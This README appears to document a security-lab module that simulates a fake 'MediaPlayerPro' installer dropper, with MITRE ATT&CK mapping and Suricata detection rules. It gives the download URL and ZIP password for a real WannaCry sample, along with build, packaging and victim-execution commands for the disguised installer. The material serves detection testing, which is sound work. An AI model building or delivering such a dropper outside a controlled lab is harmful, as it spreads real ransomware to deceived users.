# Malware Execution Module - Fake Installer Dropper

Simulates user execution of a malicious installer that downloads malware in the background.

## MITRE ATT&CK Mapping

| Technique ID | Technique Name                 | Description                       |
| ------------ | ------------------------------ | --------------------------------- |
| T1204.002    | User Execution: Malicious File | User runs malicious file          |
| T1105        | Ingress Tool Transfer          | Downloads payload from Internet   |
| T1036        | Masquerading                   | Disguises as legitimate installer |

## Components

```
src/malware-execution/
├── fake_installer.py        # Dropper source code
├── README.html              # Fake installation guide (decoy)
├── suricata.local.rules     # Detection rules (SID 9003001-9003010)
└── README.md                # This file
```

## How It Works

1. User downloads and extracts `MediaPlayerPro_Setup.zip`
2. User opens `README.html` (fake installation guide)
3. User runs `install.exe`
4. Installer displays fake "Installing... 100%" progress bar
5. In background, downloads malware sample (EICAR or theZoo WannaCry sample)
6. Shows "Installation Complete!" message
7. Detection systems trigger alerts

## Payload Configuration

The script is configured to download malware samples for testing:

```python
# Primary: WannaCry sample from theZoo (password-protected)
PAYLOAD_URL = "https://github.com/ytisf/theZoo/raw/master/malware/Binaries/Ransomware.WannaCry_Plus/Ransomware.WannaCry_Plus.zip"
ZIP_PASSWORD = b"infected"

# Alternative: EICAR test file (safe)
# PAYLOAD_URL = "https://secure.eicar.org/eicar.com.txt"
```

## Build

```bash
# Build the fake installer
python build.py malware-installer

# Output: dist/malware-installer/install.exe
```

## Create Delivery Package

```powershell
# Create ZIP package for delivery
Compress-Archive -Path "dist\malware-installer\install.exe", "src\malware-execution\README.html" -DestinationPath "dist\MediaPlayerPro_Setup.zip" -Force
```

## Execution

**On Victim (Windows):**
```powershell
# Extract and run
Expand-Archive MediaPlayerPro_Setup.zip -DestinationPath .
.\install.exe
```

## Attack Flow

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│  Windows 11     │         │   Suricata      │         │  Malware Host   │
│  (Victim)       │────────>│   (IDS)         │────────>│  (Internet)     │
│  192.168.85.150 │         │                 │         │  github.com     │
└─────────────────┘         └─────────────────┘         └─────────────────┘
        │
        │ 1. Extract MediaPlayerPro_Setup.zip
        │ 2. Open README.html (fake guide)
        │ 3. Run install.exe
        │ 4. Display "Installing... 100%"
        │ 5. Download malware sample in background
        │
        v                          │
   [Malware detected]        6. Suricata detect SID 9003001-9003003
   [AV/EDR Alert]            7. Alert -> Wazuh -> SmartXDR
        │                          │
        v                          v
   [Isolate Host]            [Quarantine File]
```

## Detection Rules (Suricata)

```
# SID 9003001: EICAR download
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE EICAR Test File Download"; http.host; content:"secure.eicar.org"; sid:9003001;)

# SID 9003002: theZoo malware repository
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE theZoo Repository Access"; http.host; content:"github.com"; http.uri; content:"/ytisf/theZoo"; sid:9003002;)

# SID 9003003: EICAR signature in response
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"MALWARE EICAR in Response"; file_data; content:"X5O!P%@AP"; sid:9003003;)
```

## Expected Results

| Component        | Action                           |
| ---------------- | -------------------------------- |
| Suricata         | Alert SID 9003001-9003003        |
| Windows Defender | Detect malware -> Quarantine     |
| Wazuh            | Sysmon Event 11 (FileCreate)     |
| SmartXDR         | Classify: ATTACK -> Isolate Host |

## Files in Delivery Package

| File          | Description                               |
| ------------- | ----------------------------------------- |
| `install.exe` | Fake installer (dropper)                  |
| `README.html` | Fake installation guide with instructions |

## Warning

> **FOR SECURITY TESTING PURPOSES ONLY**
> 
> This module simulates malware delivery and execution. Only use in controlled lab environments with proper authorization. Downloading actual malware samples (like WannaCry) requires extreme caution and should only be done in isolated environments.
